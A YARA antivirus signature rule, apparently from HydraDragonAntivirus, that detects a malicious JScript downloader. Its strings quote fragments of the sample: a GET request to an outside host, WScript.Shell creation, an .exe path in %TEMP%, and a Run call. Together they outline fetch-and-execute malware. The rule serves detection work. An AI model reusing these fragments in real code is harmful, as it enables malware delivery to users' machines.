rule sig_20160328_c5abe1c8c50d310d613dfdbb0a0efefb {
  meta:
    description = "datamaliciousorder - file 20160328_c5abe1c8c50d310d613dfdbb0a0efefb.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "713ac8b1ca0a6730ed124a03b06244391d3a41863b9d1571a7603dc9d7b3bf17"

  strings:
    $s1  = "function Rjvqxm() {return Gzjglyebnk[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"3lYC6uTJ5KHG3i.exe\";};" fullword ascii
    $s2  = "Mooawgl[Yrvptcauc](\"GET\", \"http://aicuiibf.com/l30woad\", false);" fullword ascii
    $s3  = "do {WScript[Fsahdr](Fsiymbkoa() * 11)} while (Mooawgl[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Dptxrube(Oulrnxyeur, Ivdqdafita){return Oulrnxyeur - Ivdqdafita;};" fullword ascii
    $s5  = "var Gzjglyebnk = function Yhfmaztxk() {return WScript[Bfvynqrwff](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Rysoc(Cjjrlpbbas){Gzjglyebnk[\"Run\"](Cjjrlpbbas, Diizmkbxlr, Diizmkbxlr);};" fullword ascii
    $s7  = "function Qhjtllfj() {return ((Wcdxo == true) && (Wcdxo == Frlmle)) ? 1 : Diizmkbxlr;};" fullword ascii
    $s8  = "var Wcdxo = false;" fullword ascii
    $s9  = "function Shelsuzymn(Xlrhqfla) {var Zneiey = (1, 2, 3, 4, 5, Xlrhqfla); return Zneiey;};" fullword ascii
    $s10 = "function Disxmav(){return Bfvynqrwff;};" fullword ascii
    $s11 = "Frlmle = true; " fullword ascii
    $s12 = "function Fsiymbkoa(){return 22;};" fullword ascii
    $s13 = "return Dptxrube(Gbbqhzo, Wcwhj);" fullword ascii
    $s14 = " while (Hsxit){" fullword ascii
    $s15 = "function Ogpqdefyo(){return Vwshnw;};" fullword ascii
    $s16 = "var Frlmle = false;" fullword ascii
    $s17 = "function Thtufgy()" fullword ascii
    $s18 = "var Rxxwqv = new this[\"Date\"]();" fullword ascii
    $s19 = "Wcdxo = true; " fullword ascii
    $s20 = "var Kxmqmfcto = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}